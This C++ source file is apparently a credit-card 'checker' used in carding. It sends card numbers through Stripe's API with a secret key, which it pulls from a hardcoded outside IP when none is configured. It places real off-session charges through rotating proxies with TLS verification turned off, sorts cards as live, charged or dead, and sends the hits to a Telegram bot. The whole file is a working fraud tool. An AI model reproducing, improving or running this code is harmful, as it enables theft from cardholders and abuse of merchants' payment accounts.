#include "function.h"
#include <chrono>
#include <iomanip>

std::string checker(const std::string &card) {
    
    auto start = std::chrono::high_resolution_clock::now();

    std::ifstream file("config.json");
    std::string jsonString((std::istreambuf_iterator<char>(file)),
                               std::istreambuf_iterator<char>());
    std::string tg_id = findValue(jsonString, "tg_id");
    std::string bot = findValue(jsonString, "bot");
    std::string proxy = findValue(jsonString, "proxy");
    std::string sk = findValue(jsonString, "sk");
    std::string amt = findValue(jsonString, "amount");
    std::string curr = findValue(jsonString, "currency");
    
    file.close();

    if (sk.length() < 5){
        std::string cmd = "http://104.248.154.196/";
        sk = exec(cmd.c_str());
    }

    std::string dem = "\n";

    std::vector<std::string> sks = splitString(sk, dem[0]);
    sk = getRandomElement(sks);

    std::cout << "\n" << std::endl;

    std::vector<char> separators = { ':', '|', ' ' };
    std::vector<std::string> exploded = multiexplode(separators, card);
    std::string r1;
    std::string r2;
    std::string r3;
    std::string r4;
    std::string ip;
    std::string sym = "$";

    if (!proxy.empty()){
        bool chk = check_proxy(proxy);
        if (!chk){
             std::string result = "#DEAD -» " + card + " []\nResponse -» Proxy Connect Timeout []\nRisk -» -» -»\nCountry -» \nTime -»'s";
        }
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL* curlm = curl_easy_init();
    curl_easy_setopt(curlm, CURLOPT_URL, "https://api.ipify.org");
    curl_easy_setopt(curlm, CURLOPT_WRITEFUNCTION, writeData);
    curl_easy_setopt(curlm, CURLOPT_WRITEDATA, &ip);
    if (!proxy.empty()) {
        curl_easy_setopt(curlm, CURLOPT_PROXY, proxy.c_str());
    }
    CURLcode resx = curl_easy_perform(curlm);
    curl_easy_cleanup(curlm);
    curl_global_cleanup();

    int lps = 0;

    CURL* curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    while (true) {
        curl = curl_easy_init();
        std::string url = "https://api.stripe.com/v1/payment_methods";
        std::string auth = sk + ":";
        std::string postFields = "type=card&card[number]=" + exploded[0] + "&card[exp_month]=" + exploded[1] + "&card[exp_year]=" + exploded[2];

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeData);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &r1);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
        curl_easy_setopt(curl, CURLOPT_USERPWD, auth.c_str());
        if (!proxy.empty()) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
        }
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        res = curl_easy_perform(curl);

        if (r1.find("rate_limit") != std::string::npos) {
            r1.clear();
            lps++;
            continue;
        } else {
            break;
        }
    }

    std::string msg = Getstr(r1, "\"message\": \"", "\"");
    std::string country = Getstr(r1, "\"country\": \"", "\"");
    std::string id = Getstr(r1, "\"id\": \"", "\"");

    if (!msg.empty()) {
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() / 1000.0;
        
        std::string result = "#DEAD -» " + card + " ["+ip+"]\nResponse -» " + msg + " [" + std::to_string(lps) + "]\nRisk -» -» -»\nCountry -» "+country+"\nTime -» " + std::to_string(duration)+"'s";
        std::cout << result << std::endl;

        return "END";
    }

    CURL* curls;
    CURLcode ress;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    while (true) {
        curls = curl_easy_init();
        std::string url = "https://api.stripe.com/v1/payment_intents";
        std::string auth = sk + ":";
        std::string postFields = "amount=" + std::to_string(std::stoi(amt)) + "&currency=" + curr + "&payment_method_types[]=card&description=Peaky Slanders LTD&payment_method=" + id + "&confirm=true&off_session=true";
        
        curl_easy_setopt(curls, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curls, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curls, CURLOPT_WRITEFUNCTION, writeData);
        curl_easy_setopt(curls, CURLOPT_WRITEDATA, &r2);
        curl_easy_setopt(curls, CURLOPT_POSTFIELDS, postFields.c_str());
        curl_easy_setopt(curls, CURLOPT_USERPWD, auth.c_str());
        if (!proxy.empty()) {
            curl_easy_setopt(curls, CURLOPT_PROXY, proxy.c_str());
        }
        curl_easy_setopt(curls, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curls, CURLOPT_SSL_VERIFYHOST, 0L);

        ress = curl_easy_perform(curls);

        if (r2.find("rate_limit") != std::string::npos) {
            r2.clear();
            lps++;
            continue;
        } else {
            break;
        }
    }

    msg = Getstr(r2, "\"message\": \"", "\"");

    std::string ch = Getstr(r2, "\"charge\": \"", "\"");
    if (ch.empty()){
        ch = Getstr(r2, "\"latest_charge\": \"", "\"");
    }

    std::string auth = sk + ":";
    std::string urlz = "https://api.stripe.com/v1/charges/"+ch;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL* curlz = curl_easy_init();
    curl_easy_setopt(curlz, CURLOPT_URL, urlz.c_str());
    curl_easy_setopt(curlz, CURLOPT_WRITEFUNCTION, writeData);
    curl_easy_setopt(curlz, CURLOPT_WRITEDATA, &r3);
    curl_easy_setopt(curlz, CURLOPT_USERPWD, auth.c_str());
    if (!proxy.empty()) {
        curl_easy_setopt(curlz, CURLOPT_PROXY, proxy.c_str());
    }
    CURLcode resxw = curl_easy_perform(curlz);
    curl_easy_cleanup(curlz);
    curl_global_cleanup();

    std::string rl = Getstr(r3, "\"risk_level\": \"", "\""); 
    std::string rt = Getstr(r3, "\"type\": \"", "\"");
    std::string rs =  Getstr(r3, "\"risk_score\": ", ",");
    std::string rc = Getstr(r3, "\"receipt_url\": \"", "\"");
    
    if (r2.find("insufficient_funds") != std::string::npos ||
    r2.find("incorrect_cvc") != std::string::npos ||
    r2.find("invalid_account") != std::string::npos ||
    r2.find("transaction_not_allowed") != std::string::npos ||
    r2.find("authentication_required") != std::string::npos) {
    
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() / 1000.0;
        
        std::string result = "\033[1;32m#LIVE -» " + card + " ["+ip+"]\nResponse -» " + msg + " ✅ [" + std::to_string(lps) + "]\nRisk -» "+rl+" -» "+rs+" -» "+rt+"\nCountry -» "+country+"\nTime -» " + std::to_string(duration)+"'s\033[0m";
        std::cout << result << std::endl;

        std::string rb = "#LIVE -» " + card + " ["+ip+"]\nResponse -» " + msg + " ✅ [" + std::to_string(lps) + "]\nRisk -» "+rl+" -» "+rs+" -» "+rt+"\nCountry -» "+country+"\nTime -» " + std::to_string(duration)+"'s";

        std::ofstream file("live.txt", std::ios_base::app);
        file << result << std::endl;;
        file.close();

        hit_sender(tg_id, rb, bot);

    }
    else if (r2.find("succeeded") != std::string::npos){

        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() / 1000.0;
        
        std::string result = "\033[1;32m#HITS -» " + card + " ["+ip+"]\nResponse -» " + std::to_string(std::stoi(amt)/100) + sym+" Payment Completed ✅ [" + std::to_string(lps) + "]\nReciept -» "+rc+"\nRisk -» "+rl+" -» "+rs+" -» "+rt+"\nCountry -» "+country+"\nTime -» " + std::to_string(duration)+"'s\033[0m";
        std::cout << result << std::endl;
        
        int chx = std::stoi(amt) / 100;
        std::string chg;
        std::ostringstream temp;
        temp << chx;
        chg = temp.str();
         
        std::string rb = "#HITS -» " + card + " [" + ip + "] \nResponse -» " + chg + sym + " Payment Completed ✅ [" + std::to_string(lps) + "] \nReciept -» " + rc + " \nRisk -» " + rl + " -» " + rs + " -» " + rt + " \nCountry -» " + country + " \nTime -» " + std::to_string(duration) + "'s";

        std::ofstream file("hits.txt", std::ios_base::app);
        file << result << std::endl;
        file.close();

        hit_sender(tg_id, rb, bot);
    }

    else {
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count() / 1000.0;
        
        std::string result = "#DEAD -» " + card + " ["+ip+"]\nResponse -» " + msg + " [" + std::to_string(lps) + "]\nRisk -» "+rl+" -» "+rs+" -» "+rt+"\nCountry -» "+country+"\nTime -» " + std::to_string(duration)+"'s";
        std::cout << result << std::endl;
    }

    return "END";
}